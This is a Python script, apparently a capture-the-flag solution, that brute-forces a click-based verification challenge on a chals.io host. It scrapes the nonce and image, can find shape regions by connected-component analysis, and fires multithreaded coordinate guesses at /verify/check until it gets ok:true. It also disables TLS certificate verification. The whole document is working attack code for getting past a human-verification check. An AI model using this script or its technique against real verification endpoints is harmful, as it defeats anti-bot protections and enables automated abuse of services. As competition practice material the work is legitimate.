#!/usr/bin/env python3
"""Grid-scan click coordinates for current nonce until ok:true."""
import io, json, re, ssl, sys, time
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
import numpy as np
import urllib.request
from PIL import Image

B = "https://kicyber-deea1f3c3f67-locks-of-confusion1-0-0.chals.io"
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE


def get(url):
    req = urllib.request.Request(url)
    with urllib.request.urlopen(req, context=ctx, timeout=30) as r:
        return r.read()


def post(x, y, nonce):
    body = json.dumps({"nonce": nonce, "x": int(x), "y": int(y)}).encode()
    req = urllib.request.Request(B + "/verify/check", data=body,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, context=ctx, timeout=30) as r:
        return r.read().decode()


def components(mask, minn=3):
    H, W = mask.shape
    seen = np.zeros_like(mask, dtype=bool)
    out = []
    for y in range(H):
        for x in range(W):
            if not mask[y, x] or seen[y, x]:
                continue
            q = deque([(y, x)]); seen[y, x] = True
            xs, ys = [], []
            while q:
                cy, cx = q.popleft(); xs.append(cx); ys.append(cy)
                for dy in (-1, 0, 1):
                    for dx in (-1, 0, 1):
                        ny, nx = cy + dy, cx + dx
                        if 0 <= ny < H and 0 <= nx < W and mask[ny, nx] and not seen[ny, nx]:
                            seen[ny, nx] = True; q.append((ny, nx))
            if len(xs) >= minn:
                out.append((min(xs), min(ys), max(xs), max(ys), len(xs)))
    return out


def main():
    html = get(B + "/verify").decode()
    nonce = re.search(r'var nonce = "([0-9a-f]+)"', html).group(1)
    src = re.search(r'src="(/verify/image/[0-9a-f]+)"', html).group(1)
    img = Image.open(io.BytesIO(get(B + src))).convert("RGB")
    arr = np.array(img).astype(int)
    print("nonce", nonce)

    kind = sys.argv[1] if len(sys.argv) > 1 else "full"
    step = int(sys.argv[2]) if len(sys.argv) > 2 else 8

    pts = []
    if kind == "full":
        for y in range(0, 360, step):
            for x in range(0, 640, step):
                pts.append((x, y))
    else:
        # around nodes: union of circle area and label area
        mask = (np.abs(arr - np.array([18, 18, 18])).sum(axis=2) > 100)
        comps = components(mask, minn=300)
        boxes = []
        for x0, y0, x1, y1, n in comps:
            w, h = x1 - x0 + 1, y1 - y0 + 1
            if 250 <= n <= 4000 and 0.4 <= w / h <= 2.2:
                boxes.append((x0, y0, x1, y1))
        for (x0, y0, x1, y1) in boxes:
            for y in range(max(0, y0 - 30), min(360, y1 + 45), step):
                for x in range(max(0, x0 - 30), min(640, x1 + 30), step):
                    pts.append((x, y))
    pts = list(dict.fromkeys(pts))
    print("points", len(pts), "start")

    found = None
    with ThreadPoolExecutor(max_workers=6) as ex:
        futs = {ex.submit(post, x, y, nonce): (x, y) for (x, y) in pts[:]}
        done = 0
        for f in as_completed(futs):
            x, y = futs[f]
            done += 1
            try:
                res = f.result()
            except Exception as e:
                res = "ERR"
            if '"ok":true' in res:
                found = (x, y)
                print("FOUND", x, y, res)
                break
            if done % 500 == 0:
                print("progress", done, "last", x, y, res)
    if found:
        print("SUCCESS coord", found)
        return 0
    print("no success in", len(pts))
    return 1


if __name__ == "__main__":
    sys.exit(main())